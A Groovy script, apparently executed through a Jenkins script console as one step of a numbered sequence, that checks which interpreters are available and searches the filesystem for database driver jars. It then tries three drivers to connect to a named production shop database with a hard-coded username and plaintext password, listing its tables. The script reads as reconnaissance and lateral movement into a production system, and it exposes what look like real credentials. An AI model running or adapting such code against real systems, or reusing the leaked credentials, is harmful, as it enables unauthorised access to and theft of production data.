// MICRO-AM: JDBC direct to PROD tienda DB (with proper timeout)
// appdb.claroshop-services.net:3306 is OPEN

println "=== Check available tools ==="
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    def out = new StringBuffer()
    def err = new StringBuffer()
    p.consumeProcessOutput(out, err)
    p.waitForOrKill(10000)
    out.toString().take(2000) + " [ERR:" + err.toString().take(200) + "]"
}

println "php: " + run("php --version 2>&1 | head -1")
println "perl: " + run("perl --version 2>&1 | head -1")
println "which java: " + run("which java && java -version 2>&1 | head -1")

// Try to find mysql JDBC driver in Jenkins
println "\nJDBC drivers available:"
println run("find / -name 'mysql-connector*.jar' -o -name 'mariadb*.jar' -o -name 'mysql*.jar' 2>/dev/null | grep -v proc | head -10")

// Try JDBC with timeout parameters
println "\n=== JDBC attempt with timeout ==="
try {
    Class.forName("com.mysql.cj.jdbc.Driver")
    println "MySQL JDBC driver found"
    def conn = java.sql.DriverManager.getConnection(
        "jdbc:mysql://appdb.claroshop-services.net:3306/tienda?connectTimeout=8000&socketTimeout=8000",
        "adaxxidb", "JTQ6PrkecY3y1kVN"
    )
    def stmt = conn.createStatement()
    stmt.setQueryTimeout(5)
    def rs = stmt.executeQuery("SHOW TABLES")
    def tables = []
    while (rs.next()) tables << rs.getString(1)
    conn.close()
    println "SUCCESS! Tables: " + tables.take(20).join(", ")
} catch(e) {
    println "Driver 1 FAIL: " + e.class.simpleName + ": " + e.message?.take(100)
    
    // Try alternate driver
    try {
        Class.forName("com.mysql.jdbc.Driver")
        def conn = java.sql.DriverManager.getConnection(
            "jdbc:mysql://appdb.claroshop-services.net:3306/tienda",
            "adaxxidb", "JTQ6PrkecY3y1kVN"
        )
        println "SUCCESS with old driver!"
        conn.close()
    } catch(e2) {
        println "Driver 2 FAIL: " + e2.class.simpleName + ": " + e2.message?.take(100)
    }
    
    // Try MariaDB
    try {
        Class.forName("org.mariadb.jdbc.Driver")
        def conn = java.sql.DriverManager.getConnection(
            "jdbc:mariadb://appdb.claroshop-services.net:3306/tienda?connectTimeout=8000",
            "adaxxidb", "JTQ6PrkecY3y1kVN"
        )
        println "SUCCESS with MariaDB driver!"
        conn.close()
    } catch(e3) {
        println "MariaDB driver FAIL: " + e3.class.simpleName + ": " + e3.message?.take(100)
    }
}

println "=== DONE MICRO-AM ==="
